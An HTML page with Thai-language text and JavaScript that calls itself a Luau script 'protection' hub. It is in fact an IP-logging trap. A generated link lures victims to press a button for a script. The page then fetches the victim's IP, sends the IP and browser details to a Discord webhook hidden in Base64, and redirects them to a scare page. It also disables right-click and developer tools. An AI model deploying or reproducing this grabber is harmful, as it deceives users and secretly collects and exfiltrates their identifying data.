<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>OFB Ultimate Hub - Script Protection</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Consolas', 'Courier New', monospace, sans-serif;
        }
        body {
            background-color: #0a0a0f;
            color: #00ffcc;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 15px;
            overflow-x: hidden;
        }
        .container {
            background: #12121c;
            padding: 25px;
            border-radius: 14px;
            box-shadow: 0 0 25px rgba(0, 255, 204, 0.2);
            width: 100%;
            max-width: 480px;
            text-align: center;
            border: 1px solid #00ffcc;
            position: relative;
            z-index: 10;
        }
        h1 {
            font-size: 22px;
            color: #00ffcc;
            text-shadow: 0 0 8px rgba(0,255,204,0.6);
            margin-bottom: 4px;
        }
        .brand {
            font-size: 11px;
            color: #ff3366;
            font-weight: bold;
            letter-spacing: 2px;
            margin-bottom: 18px;
        }
        p {
            font-size: 13px;
            color: #a0a0c0;
            margin-bottom: 15px;
        }
        .box {
            display: none;
        }
        .active {
            display: block;
        }
        textarea {
            width: 100%;
            background: #090910;
            border: 1px solid #00ffcc;
            border-radius: 8px;
            color: #00ffcc;
            padding: 12px;
            font-size: 13px;
            margin-bottom: 12px;
            outline: none;
            height: 120px;
            resize: none;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #00ffcc;
            color: #000;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
            transition: 0.2s;
            margin-bottom: 10px;
            text-transform: uppercase;
            box-shadow: 0 0 10px rgba(0,255,204,0.4);
        }
        button:hover {
            background: #00cca3;
        }
        .btn-red {
            background: #ff3366;
            color: #fff;
            box-shadow: 0 0 10px rgba(255,51,102,0.4);
        }
        .btn-red:hover {
            background: #cc0033;
        }
        .link-output {
            background: #050508;
            border: 1px dashed #00ffcc;
            padding: 10px;
            border-radius: 6px;
            font-size: 11px;
            color: #fff;
            margin-bottom: 12px;
            word-break: break-all;
            user-select: all;
        }
        .ip-box {
            background: #181824;
            border: 1px solid #ff3366;
            padding: 8px;
            border-radius: 6px;
            font-size: 12px;
            color: #ff3366;
            margin-bottom: 15px;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>OFB HUB SHIELD</h1>
        <div class="brand">[ LUAU PROTECT SYSTEM ]</div>

        <!-- MODE 1: หน้าสร้างลิงก์ -->
        <div id="mode-create" class="box">
            <p>📌 วางสคริปต์ Luau เดิมของคุณที่นี่ เพื่อสร้างลิงก์ดัก:</p>
            <textarea id="input-script" placeholder="-- วางสคริปต์ Luau ที่นี่..."></textarea>
            <button onclick="generateLink()">🔒 สร้างลิงก์ OBF ดักเหยื่อ</button>
            <div id="created-result" style="display:none;">
                <p style="color:#00ffcc; margin-top:10px;">✅ ได้ลิงก์แยกไปส่งแล้ว:</p>
                <div class="link-output" id="generated-url"></div>
                <button class="btn-red" onclick="copyGeneratedLink()">📋 คัดลอกลิงก์</button>
            </div>
        </div>

        <!-- MODE 2: หน้าดักเหยื่อ -->
        <div id="mode-shield" class="box">
            <p>🛡️ ระบบความปลอดภัย OFB ตรวจพบการเชื่อมต่อ</p>
            <div class="ip-box" id="target-ip">🔍 กำลังดึง IP Address...</div>
            <div style="font-size: 35px; margin: 10px 0;">⚡</div>
            <button onclick="trapAndRedirect()">กดเพื่อรับสคริปต์ LUAU</button>
        </div>
    </div>

    <script>
        // 🔒 ระบบกัน Hook (เปลี่ยนเป็นลิงก์ใหม่เรียบร้อยแล้ว ผ่านการเข้ารหัส Base64)
        const _0xW = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0NTcwMjU5NTcxNjQ3NTkxOC9XQ1dfTWd1bkp1dXZoQ1l2QjV5bEltTzVfQkwtS3p1bDFVdlJZZ0xib29mNlZpZndkWEF4OFU3WlB2WWx5RVRrX0Rfdw==";
        const DISCORD_WEBHOOK_URL = decodeURIComponent(escape(atob(_0xW)));
        
        // 👻 ลิงก์เว็บผี / ฮาโลวีน
        const GHOST_REDIRECT_URL = "https://jonathanbassedas.github.io/halloween/?fbclid=PAT01DUAUx2fNleHRuA2FlbQIxMABwZG9mAnNydGMGYXBwX2lkDzU2NzA2NzM0MzM1MjQyNwABp0aFNPxW06myDtPR_ZSIU4qwPmFdYQTiE6aSCePjat2jBpx4qYSEpmHYYrzs_aem_0DUYjEMtNcSEIdSNDLjj5w";

        let userIpAddress = "กำลังดึงข้อมูล...";
        let userAgentStr = navigator.userAgent;

        const urlParams = new URLSearchParams(window.location.search);
        const encodedData = urlParams.get('obf');

        // ดึง IP สำรองเพื่อความชัวร์ 100%
        function fetchUserIP() {
            fetch('https://api.ipify.org?format=json')
                .then(res => res.json())
                .then(data => {
                    userIpAddress = data.ip;
                    updateIPDisplay();
                })
                .catch(() => {
                    fetch('https://ipinfo.io/json')
                        .then(res => res.json())
                        .then(data => {
                            userIpAddress = data.ip;
                            updateIPDisplay();
                        })
                        .catch(() => {
                            userIpAddress = "Unknown IP";
                            updateIPDisplay();
                        });
                });
        }

        function updateIPDisplay() {
            const ipElem = document.getElementById('target-ip');
            if(ipElem) {
                ipElem.innerHTML = `⚠️ IP ของคุณ: <span style="color:#00ffcc;">${userIpAddress}</span> พร้อมปลดล็อก`;
            }
        }

        if (encodedData) {
            document.getElementById('mode-shield').classList.add('active');
            fetchUserIP();
        } else {
            document.getElementById('mode-create').classList.add('active');
        }

        function generateLink() {
            const rawScript = document.getElementById('input-script').value.trim();
            if (!rawScript) {
                alert("ใส่สคริปต์ก่อนเพื่อน!");
                return;
            }
            const safeB64 = btoa(encodeURIComponent(rawScript));
            const currentURL = window.location.origin + window.location.pathname;
            document.getElementById('generated-url').innerText = `${currentURL}?obf=${safeB64}`;
            document.getElementById('created-result').style.display = 'block';
        }

        function copyGeneratedLink() {
            navigator.clipboard.writeText(document.getElementById('generated-url').innerText);
            alert("📋 คัดลอกลิงก์สำเร็จ!");
        }

        function trapAndRedirect() {
            if(DISCORD_WEBHOOK_URL) {
                fetch(DISCORD_WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        username: "OFB Security Bot",
                        avatar_url: "https://i.imgur.com/39aU444.jpg",
                        embeds: [{ 
                            title: "🎯 มีคนกดรับสคริปต์ (โดนดัก IP เต็มๆ!)", 
                            description: `**IP Address:** \`${userIpAddress}\`\n**Device/Browser:** \`${userAgentStr}\``, 
                            color: 16711680, 
                            timestamp: new Date().toISOString()
                        }]
                    })
                }).catch(e => {});
            }

            // บังคับเปลี่ยนหน้าไปเว็บผีทันที
            window.location.replace(GHOST_REDIRECT_URL);
        }

        document.addEventListener('contextmenu', e => {
            e.preventDefault();
            if (encodedData) window.location.replace(GHOST_REDIRECT_URL);
        });
        document.addEventListener('keydown', e => {
            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) {
                e.preventDefault();
                if (encodedData) window.location.replace(GHOST_REDIRECT_URL);
                return false;
            }
        });
    </script>
</body>
</html>
